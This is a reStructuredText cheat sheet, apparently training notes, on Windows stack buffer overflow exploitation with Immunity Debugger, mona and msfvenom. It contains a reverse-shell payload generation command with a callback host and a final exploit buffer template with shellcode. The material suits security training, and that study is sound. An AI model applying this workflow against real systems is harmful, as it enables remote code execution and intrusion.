################
Buffer Overflows
################

* https://bytesoverbombs.io/exploiting-a-64-bit-buffer-overflow-469e8b500f10
* https://www.abatchy.com/2017/05/jumping-to-shellcode.html
* http://www.voidcn.com/article/p-ulyzzbfx-z.html
* https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/
* https://medium.com/@johntroony/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982

Immunity Debugger
=================

**Always run Immunity Debugger as Administrator if you can.**

There are generally two ways to use Immunity Debugger to debug an application:

1. Make sure the application is running, open Immunity Debugger, and then use :code:`File -> Attach` to attack the debugger to the running process.
2. Open Immunity Debugger, and then use :code:`File -> Open` to run the application.

When attaching to an application or opening an application in Immunity Debugger, the application will be paused. Click the "Run" button or press F9.

Note: If the binary you are debugging is a Windows service, you may need to restart the application via :code:`sc`

.. code-block:: none

    sc stop SLmail
    sc start SLmail

Some applications are configured to be started from the service manager and will not work unless started by service control.

Mona Setup
==========

Mona is a powerful plugin for Immunity Debugger that makes exploiting buffer overflows much easier. Download: :download:`mona.py <../_static/files/mona.py>`

| The latest version can be downloaded here: https://github.com/corelan/mona
| The manual can be found here: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

Copy the mona.py file into the PyCommands directory of Immunity Debugger (usually located at C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands).

In Immunity Debugger, type the following to set a working directory for mona.

.. code-block:: none

    !mona config -set workingfolder c:\mona\%p


Finding Bad Characters
======================

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

.. code-block:: none

    !mona bytearray -b "\x00"

Put the string of bad chars before the C's in your buffer, and adjust the number of C's to compensate:

.. code-block:: none

    badchars = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
    payload = badchars + "C" * (600-112-4-255)

Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Keep in mind that bad bytes will affect their trailing neighbor so try only removing the first and then retrying.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

.. code-block:: none

    !mona compare -f C:\mona\appname\bytearray.bin -a <address>

Find a Jump Point
=================

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

.. code-block:: none

    !mona jmp -r esp -cpb "\x00\x0a\x0d"

The mona find command can similarly be used to find specific instructions, though for the most part, the jmp command is sufficient:

.. code-block:: none

    !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"

Generate Payload
================

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

.. code-block:: none

    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c

Prepend NOPs
============

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.

Final Buffer
============

.. code-block:: none

    prefix = ""
    offset = 112
    overflow = "A" * offset
    retn = "\x56\x23\x43\x9A"
    padding = "\x90" * 16
    payload = "\xdb\xde\xba\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1..."
    postfix = ""
    
    buffer = prefix + overflow + retn + padding + payload + postfix

